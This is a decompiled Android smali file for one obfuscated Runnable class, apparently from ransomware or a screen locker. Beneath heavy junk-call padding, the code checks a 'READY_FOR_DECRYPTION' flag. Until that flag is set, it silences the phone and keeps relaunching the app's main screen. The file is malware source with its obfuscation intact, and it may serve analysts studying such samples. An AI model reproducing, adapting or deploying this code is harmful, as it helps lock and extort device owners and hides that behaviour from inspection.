.class Lcom/androiddg/pgroute/oRwHoDwR$2;
.super Ljava/lang/Object;
.source "oRwHoDwR.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/androiddg/pgroute/oRwHoDwR;->onCreate()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/androiddg/pgroute/oRwHoDwR;


# direct methods
.method constructor <init>(Lcom/androiddg/pgroute/oRwHoDwR;)V
    .locals 0
    .param p1, "this$0"    # Lcom/androiddg/pgroute/oRwHoDwR;

    .prologue
    .line 262
    iput-object p1, p0, Lcom/androiddg/pgroute/oRwHoDwR$2;->this$0:Lcom/androiddg/pgroute/oRwHoDwR;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 10

    .prologue
    const/4 v9, 0x1

    const/4 v8, 0x0

    .line 265
    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const-string v1, "seaaLkL"

    const-string v2, "rQCSlM"

    const-string v3, "uwmqkDkqL"

    const-string v4, "ClGWhOb"

    const-string v5, "wmLkm"

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->access$500(Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 266
    iget-object v0, p0, Lcom/androiddg/pgroute/oRwHoDwR$2;->this$0:Lcom/androiddg/pgroute/oRwHoDwR;

    invoke-virtual {v0}, Lcom/androiddg/pgroute/oRwHoDwR;->isRunning()Z

    move-result v0

    if-nez v0, :cond_0

    .line 267
    const-string v0, "GhIEIrbh"

    const-string v1, "qmcTJeDH"

    const-string v2, "IflIKj"

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const-string v4, "SEQvnCG"

    const v5, 0x202c38ae

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->access$600(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 268
    iget-object v0, p0, Lcom/androiddg/pgroute/oRwHoDwR$2;->this$0:Lcom/androiddg/pgroute/oRwHoDwR;

    invoke-static {v0}, Lcom/androiddg/pgroute/oRwHoDwR;->access$700(Lcom/androiddg/pgroute/oRwHoDwR;)Z

    move-result v0

    if-eqz v0, :cond_1

    .line 269
    const-string v0, "hhAWbW"

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x24e1ce71

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "ukaHquL"

    const-string v4, "OUAdSnd"

    const v5, 0x164e7ff5

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->access$000(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 271
    sget-boolean v0, Lcom/androiddg/pgroute/Constants;->READY_FOR_DECRYPTION:Z

    if-nez v0, :cond_0

    .line 272
    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const-string v1, "lOdOUf"

    const-string v2, "meJJBeV"

    const-string v3, "QWdhUp"

    const-string v4, "LJVmuDTk"

    const-string v5, "vQKjOMO"

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->access$500(Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 273
    const-string v0, "eTuDoke"

    const-string v1, "phOtUtClU"

    const-string v2, "TJaoas"

    invoke-static {v0, v1, v2}, Lcom/androiddg/pgroute/oRwHoDwR;->access$800(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 274
    const v0, 0x2c4e9de6

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const-string v1, "PaVsqwa"

    const-string v2, "GEAElCWjr"

    const-string v3, "qeiBVPViV"

    const-string v4, "bCCWbIIf"

    const-string v5, "ePkuwqam"

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->access$200(Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 275
    const-string v0, "OQnhUC"

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x2b9902bd

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const v3, 0x24049e99

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const-string v4, "QfElvM"

    const v5, 0x2496d5f0

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    const-string v6, "trfSlhKW"

    invoke-static/range {v0 .. v6}, Lcom/androiddg/pgroute/oRwHoDwR;->access$900(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;

    .line 276
    iget-object v0, p0, Lcom/androiddg/pgroute/oRwHoDwR$2;->this$0:Lcom/androiddg/pgroute/oRwHoDwR;

    invoke-static {v0}, Lcom/androiddg/pgroute/oRwHoDwR;->access$1000(Lcom/androiddg/pgroute/oRwHoDwR;)Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lcom/androiddg/pgroute/Utils;->enableSilentMode(Landroid/content/Context;)V

    .line 277
    const-string v0, "AOpdIKSW"

    const-string v1, "uoHJPT"

    const v2, 0x5d7d777

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "eJwFRFDk"

    const-string v4, "nUvlrOIQ"

    const-string v5, "wiFeeReHH"

    const-string v6, "CnpAtv"

    invoke-static/range {v0 .. v6}, Lcom/androiddg/pgroute/oRwHoDwR;->access$300(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 278
    const v0, 0x285439ca

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const-string v1, "lpdGrjr"

    const-string v2, "VLBaNBV"

    const-string v3, "KGbCQ"

    const-string v4, "RRacTPJD"

    const-string v5, "vCtpI"

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->access$200(Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 279
    const-string v0, "gmkuJmRFiP"

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "NwiBRiT"

    const-string v3, "vKSWhIt"

    const v4, 0x2066dab

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const v5, 0x12ae7238

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->access$400(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 280
    const-string v0, "RBTiiaqV"

    const-string v1, "WhdrAAb"

    const-string v2, "uJuVmoDq"

    invoke-static {v0, v1, v2}, Lcom/androiddg/pgroute/oRwHoDwR;->access$800(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 281
    new-instance v7, Landroid/content/Intent;

    iget-object v0, p0, Lcom/androiddg/pgroute/oRwHoDwR$2;->this$0:Lcom/androiddg/pgroute/oRwHoDwR;

    const-class v1, Lcom/androiddg/pgroute/MainActivity;

    invoke-direct {v7, v0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 282
    .local v7, "i":Landroid/content/Intent;
    const-string v0, "BqJHcNau"

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x365981ce

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "nKSIb"

    const-string v4, "sHVqsgTuR"

    const v5, 0x1e4eec61

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->access$000(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 283
    const-string v0, "gmLiRLDDq"

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "FaiHNJm"

    const-string v3, "WnAlv"

    const v4, 0x1e098a5f

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const v5, 0x368d31e7

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->access$400(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 284
    const-string v0, "kqFHDawH"

    const-string v1, "ACtQGQQA"

    const v2, 0x22617d2

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "WQUEQ"

    const-string v4, "cDoTikg"

    const-string v5, "bvEOtSt"

    const-string v6, "TTLqD"

    invoke-static/range {v0 .. v6}, Lcom/androiddg/pgroute/oRwHoDwR;->access$300(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 285
    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const-string v1, "mFiiRNqsP"

    const-string v2, "vlEIWlpQMS"

    const-string v3, "kBiDcVi"

    const-string v4, "fWKCAdW"

    const-string v5, "sccgismP"

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->access$500(Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 286
    const/high16 v0, 0x10000000

    invoke-virtual {v7, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 287
    const-string v0, "TPNiVRHq"

    const-string v1, "GnEdv"

    const-string v2, "ausgo"

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const-string v4, "gNcgegg"

    const v5, 0x258ff646

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->access$600(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 288
    const-string v0, "BeguHD"

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x27b19

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const v3, 0x1a3db713

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const-string v4, "uPDJegBm"

    const v5, 0x31a2fda0

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    const-string v6, "JcDsgeBBa"

    invoke-static/range {v0 .. v6}, Lcom/androiddg/pgroute/oRwHoDwR;->access$900(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;

    .line 289
    const-string v0, "OhEdGn"

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x2ccd4680

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "ewDwakL"

    const-string v4, "bKpAbfnG"

    const v5, 0x82121e

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->access$000(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 290
    const-string v0, "nShtOMW"

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x2a784db8

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "giRucs"

    const-string v4, "WGIhGKbKA"

    const v5, 0x246eca0b

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->access$000(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 291
    const/high16 v0, 0x20000

    invoke-virtual {v7, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 292
    const-string v0, "QhnOvAUdv"

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x1c92afda

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const v3, 0x29297f19

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const-string v4, "lMIjEGWWI"

    const v5, 0x1ab0bb79

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    const-string v6, "pjMKGfM"

    invoke-static/range {v0 .. v6}, Lcom/androiddg/pgroute/oRwHoDwR;->access$900(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;

    .line 293
    iget-object v0, p0, Lcom/androiddg/pgroute/oRwHoDwR$2;->this$0:Lcom/androiddg/pgroute/oRwHoDwR;

    invoke-virtual {v0, v7}, Lcom/androiddg/pgroute/oRwHoDwR;->startActivity(Landroid/content/Intent;)V

    .line 294
    const-string v0, "qJcswFqHBF"

    const-string v1, "UdlSKS"

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/androiddg/pgroute/oRwHoDwR;->access$100(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 307
    .end local v7    # "i":Landroid/content/Intent;
    :cond_0
    :goto_0
    return-void

    .line 298
    :cond_1
    const-string v0, "mLiTg"

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "FoReJac"

    const-string v3, "WOdSO"

    const v4, 0x1bb2b4c2

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const v5, 0x3a7bf1cf

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->access$400(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 299
    const-string v0, "LTLcuRFuk"

    const-string v1, "EIICIKW"

    const v2, 0x4c1d83b

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "QMIfrKIEAQ"

    const-string v4, "VFTcqgJRT"

    const-string v5, "IbOAr"

    const-string v6, "HacoNaeBo"

    invoke-static/range {v0 .. v6}, Lcom/androiddg/pgroute/oRwHoDwR;->access$300(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 300
    iget-object v0, p0, Lcom/androiddg/pgroute/oRwHoDwR$2;->this$0:Lcom/androiddg/pgroute/oRwHoDwR;

    invoke-static {v0}, Lcom/androiddg/pgroute/oRwHoDwR;->access$1100(Lcom/androiddg/pgroute/oRwHoDwR;)V

    .line 301
    const-string v0, "GSKjdUG"

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x275de4b4

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "HuiPRT"

    const-string v4, "OQUSpfKv"

    const v5, 0x234ff1db

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->access$000(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 302
    const-string v0, "fWKhfG"

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x1c482e8f

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "quVccBB"

    const-string v4, "IUvAKMQrfA"

    const v5, 0x2ded8450

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->access$000(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 303
    const-string v0, "vMdhpn"

    const-string v1, "HBBNoiBg"

    const-string v2, "OAMWObQ"

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const-string v4, "nErUAfl"

    const v5, 0x1a45a19c

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androiddg/pgroute/oRwHoDwR;->access$600(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    goto/16 :goto_0
.end method
